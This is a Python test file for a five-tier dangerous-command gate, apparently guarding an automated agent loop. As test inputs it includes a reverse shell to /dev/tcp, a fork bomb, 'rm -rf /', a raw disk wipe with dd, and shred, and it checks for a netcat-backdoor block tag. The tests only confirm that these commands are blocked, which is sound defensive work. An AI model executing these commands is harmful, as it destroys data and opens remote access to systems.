# -*- coding: utf-8 -*-
"""测试: gate_g4.py —— G4 危险操作门（5 层 Matcher L0-L4）。"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from loop_hermes.gate_g4 import (
    classify_command, audit_commands, is_blocked, is_warned,
    inject_g4_issues_into_state, run_gate_g4, run_gate_g4_single,
    GateLevel, MODE_MAX_LEVEL,
    L0_ALLOW_PATTERNS, L1_WARN_PATTERNS, L2_CONFIRM_PATTERNS,
    L3_BLOCK_SAFE_PATTERNS, L4_BLOCK_ALWAYS_PATTERNS,
)


def _minimal_state():
    return {
        "schema_version": 1,
        "progress": {
            "phase": "part_2_2", "cycle": 0,
            "convergence_counter": 0, "new_issues_this_round": False,
        },
        "config": {"mode": "auto", "user_request": "test"},
        "tasks": {
            "total": 0,
            "by_status": {
                "completed": 0, "in_progress": 0,
                "pending": 0, "failed": 0, "skipped": 0,
            },
        },
        "issues": {
            "active": {"p0": [], "p1": [], "p2": []},
            "resolved": {"p0": 0, "p1": 0, "p2": 0},
            "all_time": {"p0_total": 0, "p1_total": 0, "p2_total": 0},
        },
        "termination": {"status": "running"},
        "gate_state": {
            "content_safety_passed": True, "plan_confirmed": True,
            "file_modifications_this_cycle": 0,
            "dangerous_ops_blocked": [],
            "hermes_guardrail_events": [],
        },
    }


# ============================================================================
# 分类测试
# ============================================================================


class TestClassifyL0Allow:
    """L0 安全命令分类。"""

    def test_ls_is_l0(self):
        r = classify_command("ls -la")
        assert r["level"] == GateLevel.L0_ALLOW
        assert r["tag"] == "LS"

    def test_cat_is_l0(self):
        r = classify_command("cat README.md")
        assert r["level"] == GateLevel.L0_ALLOW

    def test_git_status_is_l0(self):
        r = classify_command("git status")
        assert r["level"] == GateLevel.L0_ALLOW

    def test_grep_is_l0(self):
        r = classify_command("grep -r 'pattern' src/")
        assert r["level"] == GateLevel.L0_ALLOW

    def test_echo_is_l0(self):
        r = classify_command("echo 'hello'")
        assert r["level"] == GateLevel.L0_ALLOW

    def test_ps_is_l0(self):
        r = classify_command("ps aux")
        assert r["level"] == GateLevel.L0_ALLOW


class TestClassifyL1Warn:
    """L1 警告级命令分类。"""

    def test_git_add_is_l1(self):
        r = classify_command("git add .")
        assert r["level"] == GateLevel.L1_WARN

    def test_npm_test_is_l1(self):
        r = classify_command("npm test")
        assert r["level"] == GateLevel.L1_WARN

    def test_pytest_is_l1(self):
        r = classify_command("python -m pytest tests/")
        assert r["level"] == GateLevel.L1_WARN

    def test_cargo_build_is_l1(self):
        r = classify_command("cargo build --release")
        assert r["level"] == GateLevel.L1_WARN


class TestClassifyL2Confirm:
    """L2 需确认命令分类。"""

    def test_pip_install_is_l2(self):
        r = classify_command("pip install requests")
        assert r["level"] == GateLevel.L2_CONFIRM

    def test_npm_install_is_l2(self):
        r = classify_command("npm install express")
        assert r["level"] == GateLevel.L2_CONFIRM

    def test_docker_build_is_l2(self):
        r = classify_command("docker build -t myapp .")
        assert r["level"] == GateLevel.L2_CONFIRM

    def test_git_push_is_l2(self):
        r = classify_command("git push origin main")
        assert r["level"] == GateLevel.L2_CONFIRM

    def test_apt_install_is_l2(self):
        r = classify_command("apt-get install vim")
        assert r["level"] == GateLevel.L2_CONFIRM


class TestClassifyL3BlockSafe:
    """L3 safe 拦截级命令分类。"""

    def test_rm_is_l3(self):
        r = classify_command("rm -rf temp/")
        assert r["level"] == GateLevel.L3_BLOCK_SAFE

    def test_chmod_is_l3(self):
        r = classify_command("chmod +x script.sh")
        assert r["level"] == GateLevel.L3_BLOCK_SAFE

    def test_mv_is_l3(self):
        r = classify_command("mv old.txt new.txt")
        assert r["level"] == GateLevel.L3_BLOCK_SAFE

    def test_dd_is_l3(self):
        r = classify_command("dd if=/dev/urandom of=test.bin bs=1M count=10")
        assert r["level"] == GateLevel.L3_BLOCK_SAFE

    def test_git_reset_hard_is_l3(self):
        r = classify_command("git reset --hard HEAD~1")
        assert r["level"] == GateLevel.L3_BLOCK_SAFE


class TestClassifyL4BlockAlways:
    """L4 无条件拦截分类。"""

    def test_rm_rf_root_is_l4(self):
        r = classify_command("rm -rf /")
        assert r["level"] == GateLevel.L4_BLOCK_ALWAYS

    def test_dd_wipe_is_l4(self):
        r = classify_command("dd if=/dev/zero of=/dev/sda")
        assert r["level"] == GateLevel.L4_BLOCK_ALWAYS

    def test_fork_bomb_is_l4(self):
        r = classify_command(":(){ :|:& };:")
        assert r["level"] == GateLevel.L4_BLOCK_ALWAYS

    def test_reverse_shell_is_l4(self):
        r = classify_command("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")
        assert r["level"] == GateLevel.L4_BLOCK_ALWAYS

    def test_shred_is_l4(self):
        r = classify_command("shred -f secret.key")
        assert r["level"] == GateLevel.L4_BLOCK_ALWAYS


class TestDefaultToL3:
    """未识别命令默认归入 L3。"""

    def test_unknown_command_is_l3(self):
        r = classify_command("some-unknown-cmd arg1 arg2")
        assert r["level"] == GateLevel.L3_BLOCK_SAFE
        assert r["tag"] == "UNKNOWN_CMD"

    def test_empty_command_is_l0(self):
        r = classify_command("")
        assert r["level"] == GateLevel.L0_ALLOW


# ============================================================================
# 模式判定测试
# ============================================================================


class TestIsBlocked:
    """各模式下阻断判定。"""

    def test_l4_always_blocked(self):
        r = classify_command("rm -rf /")
        assert is_blocked(r, "unsafe") is True
        assert is_blocked(r, "auto") is True
        assert is_blocked(r, "safe") is True

    def test_l3_blocked_in_safe_auto(self):
        r = classify_command("rm -f test.txt")
        assert is_blocked(r, "safe") is True
        assert is_blocked(r, "auto") is True
        assert is_blocked(r, "collaborative") is True

    def test_l3_not_blocked_in_unsafe(self):
        r = classify_command("rm -f test.txt")
        assert is_blocked(r, "unsafe") is False

    def test_l2_not_blocked_in_auto(self):
        r = classify_command("pip install requests")
        assert is_blocked(r, "auto") is False

    def test_l1_not_blocked(self):
        r = classify_command("git add .")
        assert is_blocked(r, "safe") is False
        assert is_blocked(r, "auto") is False
        assert is_blocked(r, "unsafe") is False


class TestModeMaxLevel:
    """模式最高允许等级映射。"""

    def test_unsafe_only_l4(self):
        assert MODE_MAX_LEVEL["unsafe"] == 3

    def test_auto_blocks_l3_plus(self):
        assert MODE_MAX_LEVEL["auto"] == 2

    def test_safe_blocks_l2_plus(self):
        assert MODE_MAX_LEVEL["safe"] == 1


# ============================================================================
# 批量审计测试
# ============================================================================


class TestAuditCommands:
    """批量命令审计。"""

    def test_all_safe_commands_pass(self):
        r = audit_commands(["ls", "git status", "cat README.md"])
        assert r["passed"] is True
        assert r["total_commands"] == 3
        assert r["summary"]["L0"] == 3

    def test_mixed_commands_summary(self):
        r = audit_commands(["ls", "pip install flask", "rm -rf /"])
        assert r["passed"] is False  # rm -rf / is L4 (always blocked)
        assert r["blocked"] is True

    def test_unsafe_mode_only_l4_blocked(self):
        r = audit_commands(["ls", "rm -f test.txt", "rm -rf /"], mode="unsafe")
        # rm -rf / is L4 → blocked; rm -f is L3 → not blocked in unsafe
        assert r["blocked"] is True
        assert len(r["blocked_commands"]) == 1  # only rm -rf /


class TestInjectG4Issues:
    """G4 issue 注入。"""

    def test_blocked_commands_create_issues(self):
        state = _minimal_state()
        audit = audit_commands(["rm -rf /"])
        count = inject_g4_issues_into_state(state, audit)
        assert count > 0
        assert len(state["issues"]["active"]["p0"]) > 0

    def test_safe_commands_no_issues(self):
        state = _minimal_state()
        audit = audit_commands(["ls", "cat README.md", "git status"])
        count = inject_g4_issues_into_state(state, audit)
        assert count == 0


class TestRunGateG4:
    """高层接口 run_gate_g4。"""

    def test_run_gate_safe_commands(self):
        state = _minimal_state()
        result = run_gate_g4(["ls -la", "git status"], state)
        assert result["passed"] is True

    def test_run_gate_dangerous_command(self):
        state = _minimal_state()
        result = run_gate_g4(["rm -rf /"], state)
        assert result["blocked"] is True

    def test_run_gate_g4_single(self):
        state = _minimal_state()
        result = run_gate_g4_single("ls -la", state)
        assert result["passed"] is True

    def test_unknown_command_blocked_in_auto(self):
        state = _minimal_state()
        state["config"]["mode"] = "auto"
        result = run_gate_g4(["some-unknown-tool --flag"], state)
        # 未知命令默认 L3，auto 模式拦截
        assert result["blocked"] is True


class TestPatternCompleteness:
    """验证 5 层模式定义完整性。"""

    def test_all_layers_have_patterns(self):
        assert len(L0_ALLOW_PATTERNS) > 5
        assert len(L1_WARN_PATTERNS) > 5
        assert len(L2_CONFIRM_PATTERNS) > 5
        assert len(L3_BLOCK_SAFE_PATTERNS) > 5
        assert len(L4_BLOCK_ALWAYS_PATTERNS) > 5

    def test_l4_has_high_priority_patterns(self):
        """L4 应包含关键的灾难性模式。"""
        tags = {item[1] for item in L4_BLOCK_ALWAYS_PATTERNS}
        assert "RM_RF_ROOT" in tags
        assert "FORK_BOMB_BASH" in tags
        assert "NC_BACKDOOR" in tags
